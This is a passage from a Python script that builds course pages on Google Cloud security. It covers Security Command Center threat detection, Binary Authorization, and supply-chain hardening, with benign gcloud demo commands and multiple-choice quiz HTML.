        <p>SCC continuously discovers assets across your GCP organization, flagging misconfigurations like public Cloud Storage buckets, open firewall rules, or default service accounts with owner privileges.</p>
        <h4>Layer 2 — Practitioner: Built-in Threat Detectors</h4>
        <p><strong>Event Threat Detection (ETD)</strong> parses DNS logs, VPC flows, and audit logs for anomalies (DDoS, brute-force SSH, data exfiltration). <strong>Container Threat Detection (CTD)</strong> detects malicious binaries executed inside GKE pods or reverse shells.</p>
        <h4>Layer 3 — Architect: Automated Incident Response (SOAR)</h4>
        <p>Connect SCC findings to Pub/Sub topics. Cloud Functions or Cloud Run microservices consume finding events and execute automated containment playbooks: isolating a compromised VM, revoking an IAM token, or blocking an IP on Cloud Armor.</p>
        <h4>Layer 4 — Staff: Chronicle SIEM & Threat Hunting</h4>
        <p>Staff architects integrate GCP logs into Chronicle SecOps, querying petabytes of telemetry with sub-second YARA-L rules to track Advanced Persistent Threats (APTs) across hybrid cloud environments.</p>
        """,
        "part3_narrative_html": "<p>In Cloud City, Warden Ward's centralized alarm panel flashes red whenever an unauthorized gate is opened after hours.</p>",
        "part4_demo_html": """
        <div class="callout">
          <div class="callout-title">Hands-On Demo: Querying Active SCC Findings via gcloud</div>
          <p>Inspect active high-severity security findings across your organization.</p>
        </div>
        <pre><code class="language-bash"># 1. List active HIGH and CRITICAL severity findings
gcloud scc findings list "organizations/123456789012" \\
    --filter='state="ACTIVE" AND severity="HIGH"' \\
    --page-size=10

# 2. Export SCC findings to a Pub/Sub topic for automated remediation
gcloud scc notifications create sec-finding-alerts \\
    --organization="123456789012" \\
    --pubsub-topic="projects/sec-ops-project/topics/security-findings-topic" \\
    --filter='state="ACTIVE" AND severity="CRITICAL"'</code></pre>
        """,
        "quiz_html": """
        <div class="quiz-card">
          <span class="quiz-badge">Band: Threat Detection (Question 1)</span>
          <p><strong>A security operations team needs automated detection of unauthorized cryptocurrency mining malware executing inside container pods across multiple GKE clusters. Which Google Cloud capability fulfills this requirement?</strong></p>
          <ul class="quiz-options">
            <li class="quiz-option" onclick="checkQuiz(this, true, 'Correct! Container Threat Detection (part of SCC Premium) monitors container runtime execution, detecting cryptomining, reverse shells, and unauthorized binary execution inside pods.')">A) Security Command Center Premium with Container Threat Detection enabled.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'SCC Standard only provides basic asset discovery and does not include runtime container threat detection.')">B) Security Command Center Standard tier with default logging.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Cloud Armor operates at the network HTTP(S) edge; it cannot inspect binary execution inside GKE worker nodes.')">C) Cloud Armor WAF rules configured for Layer 7 inspection.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Firewall rules manage IP packet routing; they do not detect malicious CPU process execution.')">D) Default VPC egress firewall rules.</li>
          </ul>
          <div class="quiz-explanation"></div>
        </div>
        """,
        "reading_html": "<ul><li><a href='https://cloud.google.com/security-command-center/docs' target='_blank'>Security Command Center Documentation</a></li><li><a href='https://cloud.google.com/chronicle/docs' target='_blank'>Google Chronicle Security Operations Overview</a></li></ul>"
    },

    # 039: Application and Supply-Chain Security
    {
        "topic_no": "039",
        "roadmap_id": "5.5b",
        "title": "Application & Supply-Chain Security: Binary Authorization & SLSA",
        "page_type": "concept",
        "phase": "Phase 5 — Security and Compliance",
        "lead": "Hardening the software delivery pipeline: Secure SDLC, Artifact Analysis vulnerability scanning, Binary Authorization cryptographic attestations, SLSA framework levels, and Distroless containers.",
        "comp1": ("Developer Workstation", "Signed Git Commit", "control", "Author commits cryptographically signed code adhering to peer review policies."),
        "comp2": ("Secure CI/CD Pipeline", "Cloud Build & Artifact Analysis", "control", "Compiles code, runs automated security vulnerability scans, and generates SBOMs."),
        "comp3": ("Binary Authorization Attestor", "Cloud KMS Signing", "control", "Signs cryptographic attestation affirming that the container passed all QA and vulnerability gates."),
        "comp4": ("GKE Admission Controller", "Binary Authorization Enforcer", "data", "Blocks pod deployment if the container image lacks a valid cryptographic attestation signature."),
        "flow1": "Cloud Build builds container image and publishes to Artifact Registry.",
        "flow2": "Artifact Analysis scans image; finding zero critical CVEs, an Attestor signs the digest using Cloud KMS.",
        "flow3": "Developer attempts to deploy container to production GKE cluster.",
        "fail": "A malicious actor injects an unverified, untrusted container image directly into the production cluster.",
        "heal": "Binary Authorization admission webhook intercepts request, rejects un-attested image, and alerts security team.",
        "city_concept": "City Guild Assay Marks & Food Purity Seals",
        "p1": "Street vendors were selling flour tainted with chalk dust, stamping fake merchant logos on sacks to fool consumers.",
        "p2": "The Guildmaster introduced the Assay Purity Seal (Binary Authorization): every flour sack was stamped with a wax seal signed by the master inspector.",
        "p3": "City market guards checked the wax seal at the gate; any unstamped sack was immediately seized and burned.",
        "p4": "Physical wax seals can be forged; digital cryptographic attestations use asymmetric 4096-bit RSA keys that are impossible to counterfeit.",
        "part1_html": """
        <h3>The Situation: The Rise of Software Supply Chain Attacks</h3>
        <p>
          In modern software delivery, attackers rarely attack hardened production firewalls directly. Instead, they poison the <strong>software supply chain</strong>: tampering with open-source dependencies, compromising CI/CD pipelines, or pushing unauthorized container images directly to registries.
        </p>
        <p>
          Google Cloud provides an end-to-end framework adhering to <strong>SLSA (Supply-chain Levels for Software Artifacts)</strong> to guarantee software integrity from source code to production deployment.
        </p>
        <div class="callout">
          <div class="callout-title">The Three Pillars of Cloud Supply Chain Security</div>
          <ul>
            <li><strong>Artifact Analysis:</strong> Automated container vulnerability scanning in Artifact Registry for OS package CVEs and language dependencies (Java, Node, Python, Go).</li>
            <li><strong>Binary Authorization:</strong> A deploy-time admission control security policy on GKE and Cloud Run that ensures only trusted, cryptographically signed container images can run.</li>
            <li><strong>Distroless & Hardened Images:</strong> Stripping package managers, shells, and debugging tools from containers to minimize attack surfaces and CVE exposure.</li>
          </ul>
        </div>
        """,
        "part2_ladder_html": """
        <h4>Layer 1 — Foundation: Distroless Containers & Non-Root Execution</h4>
        <p>Never run containers as <code>root</code>. Build images using Google's open-source <strong>Distroless</strong> base images: they contain only your compiled application and runtime dependencies, without a bash shell or package manager.</p>
        <h4>Layer 2 — Practitioner: Automated Vulnerability Scanning in Artifact Registry</h4>
        <p>Artifact Analysis scans every pushed container image against the national vulnerability database (NVD). Set policy rules that block promotion of any image containing unresolved <code>CRITICAL</code> or <code>HIGH</code> CVEs.</p>
        <h4>Layer 3 — Architect: Binary Authorization with Cloud KMS Attestations</h4>
        <p>Establish multiple attestor gates: (1) Unit Tests Passed, (2) Vulnerability Scan Clear, (3) Security Lead Approved. Cloud KMS signs an attestation for each gate. GKE admission controllers require all signatures before launching the pod.</p>
        <h4>Layer 4 — Staff: Software Bill of Materials (SBOM) & SLSA Level 3</h4>
        <p>Staff architects automate SBOM generation for every build, providing complete provenance tracing back to exact Git commit hashes, builder identities, and dependency manifests.</p>
        """,
        "part3_narrative_html": "<p>In Cloud City, Guildmaster Arthur inspects all merchant goods, affixing certified wax seals before wagons enter the marketplace.</p>",
        "part4_demo_html": """
        <div class="callout">
          <div class="callout-title">Hands-On Demo: Enabling Binary Authorization on a GKE Cluster</div>
          <p>Enforce deploy-time verification of container signatures on your Kubernetes workloads.</p>
        </div>
        <pre><code class="language-bash"># 1. Enable Binary Authorization on a GKE cluster
gcloud container clusters update my-secure-cluster \\
    --region=us-central1 \\
    --binauthz-evaluation-mode=PROJECT_SINGLETON_POLICY_ENFORCE

# 2. View current Binary Authorization policy
gcloud container binauthz policy export > policy.yaml

# 3. Policy snippet requiring attestors (policy.yaml):
# defaultAdmissionRule:
#   evaluationMode: REQUIRE_ATTESTATION
#   enforcementMode: ENFORCING
#   requireAttestationsBy:
#     - projects/PROJECT_ID/attestors/build-attestor

# 4. Import updated policy
gcloud container binauthz policy import policy.yaml</code></pre>
        """,
        "quiz_html": """
        <div class="quiz-card">
          <span class="quiz-badge">Band: Supply Chain Security (Question 1)</span>
          <p><strong>A financial enterprise wants to guarantee that only container images that have been scanned and verified by their automated CI/CD security pipeline can be deployed to production GKE clusters, blocking any manual image injections by cluster administrators. Which solution should you implement?</strong></p>
          <ul class="quiz-options">
            <li class="quiz-option" onclick="checkQuiz(this, true, 'Correct! Binary Authorization acts as an admission controller enforcing that container images must have cryptographic attestation signatures before GKE will allow them to deploy.')">A) Implement Binary Authorization on GKE requiring cryptographic attestations signed by the CI/CD pipeline's Cloud KMS key.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Read-only registry permissions do not prevent administrators from running un-scanned public images directly from Docker Hub.')">B) Configure the Artifact Registry with read-only permissions for developers.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'VPC firewall rules cannot verify container cryptographic signatures or image provenance.')">C) Use VPC firewall rules to restrict traffic to the GKE nodes.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Manual inspections do not provide cryptographically enforced deploy-time gating and are prone to human error.')">D) Require developers to manually review image checksums before executing kubectl apply.</li>
          </ul>
          <div class="quiz-explanation"></div>
        </div>
        """,
        "reading_html": "<ul><li><a href='https://cloud.google.com/binary-authorization/docs' target='_blank'>Binary Authorization on Google Cloud</a></li><li><a href='https://slsa.dev/' target='_blank'>SLSA: Supply-chain Levels for Software Artifacts</a></li></ul>"
    }
]

def main():
    print(f"Building Phase 5 (Topics 034 to 039) - {len(PHASE5_TOPICS)} topics...")
    for item in PHASE5_TOPICS:
        t_no = item["topic_no"]
        r_id = item["roadmap_id"]
        title = item["title"]
        
        d1 = make_d1_map(t_no, r_id, title, item["comp1"], item["comp2"], item["comp3"], item["comp4"])
        d2 = make_d2_flow(t_no, r_id, title, item["flow1"], item["flow2"], item["flow3"])
        d3 = make_d3_failure(t_no, r_id, title, item["fail"], item["heal"])
        analogy = make_analogy(t_no, r_id, title, item["city_concept"], item["p1"], item["p2"], item["p3"], item["p4"])
        
        topic_data = {
            "topic_no": t_no,
            "roadmap_id": r_id,
            "title": title,
            "page_type": item["page_type"],
            "phase": item["phase"],
            "lead": item["lead"],
            "d1": d1,
            "d2": d2,
            "d3": d3,
            "analogy": analogy,
            "part1_html": item["part1_html"],
            "part2_ladder_html": item["part2_ladder_html"],
            "part3_narrative_html": item["part3_narrative_html"],
            "part4_demo_html": item["part4_demo_html"],
            "quiz_html": item["quiz_html"],
            "reading_html": item["reading_html"]
        }
        build_topic_page(topic_data)
        print(f"  ✓ Generated Topic {t_no}: {title}")

if __name__ == "__main__":
    main()
